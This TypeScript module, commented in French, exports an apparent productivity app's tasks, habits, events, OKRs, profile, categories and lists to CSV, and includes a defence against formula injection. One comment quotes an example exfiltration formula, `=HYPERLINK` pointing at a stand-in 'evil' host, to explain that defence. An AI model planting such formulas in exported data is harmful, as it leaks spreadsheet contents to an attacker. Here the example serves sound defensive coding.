/**
 * CSV export — utilitaires client-side pour exporter tâches, habitudes,
 * événements et OKR au format CSV (RFC 4180-ish).
 *
 * Pas de dépendance — String concat + Blob download. Compatible Excel + Google
 * Sheets (le séparateur est la virgule, l'encoding est UTF-8 avec BOM pour
 * forcer Excel à reconnaître les caractères accentués).
 */

import type { Task } from '@/modules/tasks';
import type { Habit } from '@/modules/habits';
import type { CalendarEvent } from '@/modules/events';
import type { OKR } from '@/modules/okrs';
import type { Category } from '@/modules/categories';
import type { TaskList } from '@/modules/lists';

/**
 * Échappe une valeur pour CSV : entoure de guillemets si contient virgule,
 * guillemet, ou retour à la ligne. Les guillemets internes sont doublés.
 *
 * Protège aussi contre la **CSV formula injection** (faille N11) : Excel /
 * Google Sheets interprètent comme formule toute cellule dont le 1er caractère
 * est `= + - @ \t \r`. Un nom de tâche `=HYPERLINK("http://evil/?leak="&A1)`
 * exfiltrerait des données à l'ouverture du fichier. Le mitigateur standard
 * (OWASP) est de préfixer une apostrophe (`'`) — invisible à l'affichage,
 * neutralise l'interprétation formule.
 */
export function escapeCSV(value: unknown): string {
  if (value === null || value === undefined) return '';
  let str = String(value);
  if (str.length > 0 && /^[=+\-@\t\r]/.test(str)) {
    str = `'${str}`;
  }
  if (/[",\n\r]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

export function rowsToCSV(headers: string[], rows: unknown[][]): string {
  const head = headers.map(escapeCSV).join(',');
  const body = rows.map(r => r.map(escapeCSV).join(',')).join('\n');
  // BOM UTF-8 pour Excel (sinon les accents s'affichent en gibberish)
  //  = zero-width no-break space = UTF-8 BOM
  return `\uFEFF${head}\n${body}`;
}

function download(filename: string, content: string) {
  const blob = new Blob([content], { type: 'text/csv;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function todayStr(): string {
  return new Date().toISOString().split('T')[0];
}

/**
 * Export CSV générique (headers + rows déjà construits) — même échappement
 * anti formula-injection (N11) que les exports par module. Le nom de fichier
 * est suffixé de la date du jour.
 */
export function downloadCSV(baseName: string, headers: string[], rows: unknown[][]): void {
  download(`${baseName}-${todayStr()}.csv`, rowsToCSV(headers, rows));
}

// ═══════════════════════════════════════════════════════════════════
// Exports par module
// ═══════════════════════════════════════════════════════════════════

export function exportTasksCSV(tasks: Task[]): void {
  const headers = ['ID', 'Nom', 'Catégorie', 'Priorité', 'Échéance', 'Durée (min)', 'Complétée', 'Favori', 'Créée le'];
  const rows = tasks.map(t => [
    t.id,
    t.name,
    t.category,
    t.priority,
    t.deadline,
    t.estimatedTime,
    t.completed ? 'Oui' : 'Non',
    t.bookmarked ? 'Oui' : 'Non',
    t.createdAt,
  ]);
  download(`cosmo-taches-${todayStr()}.csv`, rowsToCSV(headers, rows));
}

export function exportHabitsCSV(habits: Habit[]): void {
  const headers = ['ID', 'Nom', 'Description', 'Fréquence', 'Durée (min)', 'Couleur', 'Complétions', 'Créée le'];
  const rows = habits.map(h => {
    // ⚠️ `completionsTotal` d'abord : depuis la mig. 119, `h.completions` est
    // borné à une fenêtre glissante en mode Supabase. Compter dessus donnerait
    // un export TRONQUÉ — inacceptable pour un export, qui est le support du
    // droit à la portabilité (RGPD art. 20). Le repli couvre la démo et le
    // repository local, où `completions` contient tout.
    //
    // ⚠️ Le repli applique les MÊMES exclusions que le SQL (clé au format
    // `YYYY-MM-DD`, jour non futur) : sans ça, le même jeu de données donnait
    // deux totaux différents entre la démo et la production, dans un export
    // censé faire foi.
    const today = new Date().toLocaleDateString('en-CA');
    const localCount = Object.entries(h.completions).filter(
      ([day, done]) => done && /^\d{4}-\d{2}-\d{2}$/.test(day) && day <= today,
    ).length;
    const completionsCount = h.completionsTotal ?? localCount;
    return [
      h.id,
      h.name,
      h.description || '',
      h.frequency,
      h.estimatedTime,
      h.color,
      completionsCount,
      h.createdAt || '',
    ];
  });
  download(`cosmo-habitudes-${todayStr()}.csv`, rowsToCSV(headers, rows));
}

export function exportEventsCSV(events: CalendarEvent[]): void {
  const headers = ['ID', 'Titre', 'Début', 'Fin', 'Couleur', 'Notes', 'Récurrent'];
  const rows = events.map(e => [
    e.id,
    e.title,
    e.start,
    e.end,
    e.color || '',
    e.notes || '',
    e.recurrence ? 'Oui' : 'Non',
  ]);
  download(`cosmo-agenda-${todayStr()}.csv`, rowsToCSV(headers, rows));
}

export function exportOKRsCSV(okrs: OKR[]): void {
  // Une ligne par KR (avec OKR parent dénormalisé), plus exploitable en tableur
  const headers = [
    'OKR ID',
    'OKR Titre',
    'OKR Description',
    'OKR Catégorie',
    'OKR Progression',
    'OKR Début',
    'OKR Fin',
    'KR Titre',
    'KR Valeur actuelle',
    'KR Valeur cible',
    'KR Unité',
    'KR Complétée',
  ];
  const rows: unknown[][] = [];
  okrs.forEach(okr => {
    if (okr.keyResults.length === 0) {
      rows.push([okr.id, okr.title, okr.description, okr.category, okr.progress, okr.startDate, okr.endDate, '', '', '', '', '']);
    } else {
      okr.keyResults.forEach(kr => {
        rows.push([
          okr.id,
          okr.title,
          okr.description,
          okr.category,
          okr.progress,
          okr.startDate,
          okr.endDate,
          kr.title,
          kr.currentValue,
          kr.targetValue,
          kr.unit,
          kr.completed ? 'Oui' : 'Non',
        ]);
      });
    }
  });
  download(`cosmo-okr-${todayStr()}.csv`, rowsToCSV(headers, rows));
}

/**
 * Profil — identité et préférences fournies par la personne.
 *
 * Absent de l'export jusqu'au 2026-08-26, alors que c'est la donnée la plus
 * évidemment « fournie par la personne concernée » au sens de l'article 20 :
 * son nom et son adresse. Un export qui livre les tâches mais pas l'identité
 * de leur auteur est incomplet.
 *
 * ❌ Ne jamais exporter l'URL de l'avatar : c'est une URL de stockage signée
 *    ou publique, pas une donnée que la personne a fournie. On indique sa
 *    PRÉSENCE, ce qui suffit à savoir qu'il faut la réclamer.
 */
export function exportProfileCSV(profile: {
  id: string;
  name: string;
  email: string;
  avatar?: string;
  autoValidation?: boolean;
}): void {
  const headers = ['Champ', 'Valeur'];
  const rows: unknown[][] = [
    ['Identifiant', profile.id],
    ['Nom', profile.name],
    ['Email', profile.email],
    ['Avatar', profile.avatar ? 'oui' : 'non'],
    ['Validation automatique', profile.autoValidation ? 'oui' : 'non'],
  ];
  download(`cosmo-profil-${todayStr()}.csv`, rowsToCSV(headers, rows));
}

/** Catégories — créées par la personne, donc portables. */
export function exportCategoriesCSV(categories: Category[]): void {
  const headers = ['Id', 'Nom', 'Couleur'];
  const rows = categories.map((c) => [c.id, c.name, c.color]);
  download(`cosmo-categories-${todayStr()}.csv`, rowsToCSV(headers, rows));
}

/**
 * Listes — y compris les listes intelligentes.
 *
 * `taskIds` est exporté en COMPTE et non en liste d'identifiants : le
 * rattachement d'une tâche à une liste est déjà porté par l'export des tâches,
 * et recopier des centaines d'identifiants dans une cellule rendrait le
 * fichier illisible sans rien ajouter.
 */
export function exportListsCSV(lists: TaskList[]): void {
  const headers = ['Id', 'Nom', 'Couleur', 'Type', 'Regle intelligente', 'Nombre de taches'];
  const rows = lists.map((l) => [
    l.id,
    l.name,
    l.color,
    l.type ?? 'manual',
    l.smartRule ?? '',
    l.taskIds?.length ?? 0,
  ]);
  download(`cosmo-listes-${todayStr()}.csv`, rowsToCSV(headers, rows));
}

/**
 * Export combiné — déclenche les téléchargements en séquence (Safari refuse
 * souvent plusieurs `.click()` simultanés, on les espace de 150 ms).
 *
 * ⚠️ Sept fichiers depuis le 2026-08-26, contre quatre avant : profil,
 * catégories et listes manquaient. Toute nouvelle donnée SAISIE par
 * l'utilisateur doit rejoindre cette fonction, sinon l'export cesse
 * silencieusement d'être complet et la portabilité devient un mensonge.
 */
export function exportAllCSV(data: {
  tasks: Task[];
  habits: Habit[];
  events: CalendarEvent[];
  okrs: OKR[];
  categories: Category[];
  lists: TaskList[];
  profile: { id: string; name: string; email: string; avatar?: string; autoValidation?: boolean };
}): void {
  exportTasksCSV(data.tasks);
  setTimeout(() => exportHabitsCSV(data.habits), 150);
  setTimeout(() => exportEventsCSV(data.events), 300);
  setTimeout(() => exportOKRsCSV(data.okrs), 450);
  setTimeout(() => exportCategoriesCSV(data.categories), 600);
  setTimeout(() => exportListsCSV(data.lists), 750);
  setTimeout(() => exportProfileCSV(data.profile), 900);
}
